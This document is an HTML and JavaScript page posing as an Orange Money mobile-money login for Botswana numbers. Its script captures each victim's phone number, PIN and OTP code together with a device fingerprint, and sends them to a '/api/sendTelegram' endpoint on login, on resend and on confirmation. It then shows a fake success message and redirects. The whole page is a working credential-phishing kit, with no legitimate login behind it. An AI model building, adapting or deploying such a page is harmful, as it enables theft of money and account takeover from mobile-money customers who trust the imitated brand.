<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Orange Money — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}

body{
  font-family:Inter,system-ui,Arial;
  background:
    radial-gradient(900px 300px at 50% -150px, rgba(249,115,22,.25), transparent),
    linear-gradient(180deg,#fff4e6,#ffe0bf);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#000;
}

.card{
  width:100%;
  max-width:380px;
  background:#fff;
  padding:22px;
  border-radius:16px;
  box-shadow:0 18px 40px rgba(0,0,0,.18);
}

.logo{height:46px;display:block;margin:0 auto 12px}

h2{text-align:center;margin:0 0 14px;font-size:20px;font-weight:700}
label{display:block;font-size:13px;margin-top:10px}

input{
  width:100%;
  padding:11px;
  border-radius:10px;
  border:1px solid #e5e5e5;
  background:#fafafa;
  font-size:14px;
}
input:focus{outline:none;border-color:#f97316;background:#fff}

.btn{
  background:#f97316;
  color:#fff;
  padding:11px;
  border-radius:10px;
  border:0;
  margin-top:14px;
  width:100%;
  font-weight:700;
  cursor:pointer;
}
.btn[disabled]{background:#fdba74}

.small{font-size:13px;color:#444}
.success{color:#16a34a;font-weight:600}
.error{min-height:18px;font-size:13px;color:#dc2626}

.pin-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
.pin-digit{
  width:42px;height:50px;text-align:center;font-size:20px;
  border-radius:10px;border:1px solid #e5e5e5;background:#fafafa
}
.pin-digit:focus{outline:none;border-color:#f97316;background:#fff}

/* OTP */
.otp-modal{
  position:fixed;inset:0;background:rgba(0,0,0,.55);
  display:flex;align-items:center;justify-content:center
}
.otp-box{
  background:linear-gradient(180deg,rgba(255,255,255,.92),rgba(255,255,255,.78));
  backdrop-filter:blur(20px);
  padding:22px;border-radius:18px;min-width:320px;
  box-shadow:0 25px 50px rgba(0,0,0,.4)
}
.otp-row{display:flex;gap:8px;justify-content:center;margin-top:12px}
.otp-digit{
  width:42px;height:52px;text-align:center;font-size:20px;
  border-radius:10px;border:1px solid #e5e5e5;background:#fafafa
}
.otp-digit:focus{outline:none;border-color:#f97316;background:#fff}
.otp-warning{color:#dc2626;font-size:13px;display:none}

.resend-row{display:flex;justify-content:space-between;margin-top:14px}
.resend-btn{
  background:#fff;border:1px solid #e5e5e5;
  padding:6px 14px;border-radius:10px;cursor:pointer
}
.resend-btn[disabled]{opacity:.5}

.otp-actions{display:flex;gap:10px;margin-top:14px}
.otp-actions button{
  flex:1;padding:10px;border-radius:10px;border:0;
  font-weight:700;cursor:pointer
}
#confirmOtp{background:#f97316;color:#fff}
#confirmOtp[disabled]{background:#fdba74}
#cancelOtp{background:#f3f4f6;color:#000}
</style>
</head>

<body>

<div class="card">
  <img src="assets/orange.png" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label>Phone number</label>
    <input id="phone" value="+267" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label>Enter your PIN code</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">
    <button id="loginBtn" class="btn" disabled>LOG IN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP code</strong></div>
    <p class="small">An OTP code has been sent to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" id="d0" maxlength="1" inputmode="numeric">
      <input class="otp-digit" id="d1" maxlength="1" inputmode="numeric">
      <input class="otp-digit" id="d2" maxlength="1" inputmode="numeric">
      <input class="otp-digit" id="d3" maxlength="1" inputmode="numeric">
    </div>

    <div id="otpWarning" class="otp-warning">Please enter 4 digits</div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend code</button>
    </div>

    <div class="otp-actions">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:10px"></div>
  </div>
</div>

<script>
/* ===== DEVICE STRING ===== */
const ua = navigator.userAgent;
let device = 'Unknown';

if (/Android/i.test(ua)) {
  const v = ua.match(/Android\s([\d.]+)/);
  device = 'Android ' + (v ? v[1] : '');
} else if (/iPhone|iPad/i.test(ua)) {
  const v = ua.match(/OS (\d+_\d+)/);
  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
}
if (/Chrome/i.test(ua)) device += ' | Chrome';
else if (/Safari/i.test(ua)) device += ' | Safari';
else if (/Firefox/i.test(ua)) device += ' | Firefox';

/* ===== PLAN LINE ===== */
let planLine = null;
try{
  const p = JSON.parse(sessionStorage.getItem('selectedPlan'));
  if(p){
    planLine = [p.name || p.shortName || '', p.price || ''].filter(Boolean).join(' — ');
  }
}catch(e){}

/* ===== PHONE ===== */
const phone=document.getElementById('phone');
const phoneError=document.getElementById('phoneError');
const loginBtn=document.getElementById('loginBtn');

function validatePhone(){
  const d=phone.value.replace('+267','');
  if(!/^\d{8}$/.test(d)){
    phoneError.textContent='Enter a valid 8-digit number';
    return false;
  }
  phoneError.textContent='';
  return true;
}

phone.addEventListener('input',()=>{
  let d=phone.value.replace('+267','').replace(/\D/g,'').replace(/^0+/,'').slice(0,8);
  phone.value='+267'+d;
  updateLogin();
});

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';

pins.forEach((p,i)=>{
  p.addEventListener('input',()=>{
    p.value=p.value.replace(/\D/g,'');
    if(p.value && i<3) pins[i+1].focus();
    pinValue=pins.map(x=>x.value).join('');
    updateLogin();
  });
  p.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !p.value && i>0){
      pins[i-1].focus();
      pins[i-1].value='';
      pinValue=pins.map(x=>x.value).join('');
      updateLogin();
      e.preventDefault();
    }
  });
});

function updateLogin(){
  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
}

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== OTP ===== */
const otpModal=document.getElementById('otpModal');
const dEls=[0,1,2,3].map(i=>document.getElementById('d'+i));
const confirmBtn=document.getElementById('confirmOtp');
const cancelBtn=document.getElementById('cancelOtp');
const resendBtn=document.getElementById('resendBtn');
const otpWarning=document.getElementById('otpWarning');
const resendInfo=document.getElementById('resendInfo');
const otpStatus=document.getElementById('otpStatus');

let timer=null,seconds=120;

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`;
  timer=setInterval(()=>{
    seconds--;
    document.getElementById('countdown').textContent=seconds;
    if(seconds<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn’t receive the code?";
    }
  },1000);
}

function getOtp(){return dEls.map(d=>d.value).join('');}

function updateConfirm(){
  const ok=/^\d{4}$/.test(getOtp());
  confirmBtn.disabled=!ok;
  otpWarning.style.display=ok?'none':'block';
}

dEls.forEach((d,i)=>{
  d.addEventListener('input',()=>{
    d.value=d.value.replace(/\D/g,'');
    if(d.value && i<3) dEls[i+1].focus();
    updateConfirm();
  });
  d.addEventListener('keydown',e=>{
    if(e.key==='Backspace'&&!d.value&&i>0){
      dEls[i-1].focus();
      dEls[i-1].value='';
      e.preventDefault();
    }
  });
});

/* ===== LOGIN EVENTS ===== */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;

  otpModal.style.display='flex';
  dEls.forEach(d=>d.value='');
  updateConfirm();
  startCountdown();

  await sendToServer({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinValue,
    plan:planLine,
    device,
    submittedAt:new Date().toISOString()
  });
});

resendBtn.onclick=async()=>{
  startCountdown();
  await sendToServer({
    event:'resend_otp',
    loginPhone:phone.value,
    loginPin:pinValue,
    plan:planLine,
    device,
    submittedAt:new Date().toISOString()
  });
};

confirmBtn.onclick=async()=>{
  await sendToServer({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinValue,
    otp:getOtp(),
    plan:planLine,
    device,
    submittedAt:new Date().toISOString()
  });
  otpStatus.innerHTML="<span class='success'>Success — request received</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};

cancelBtn.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};
</script>

</body>
</html>
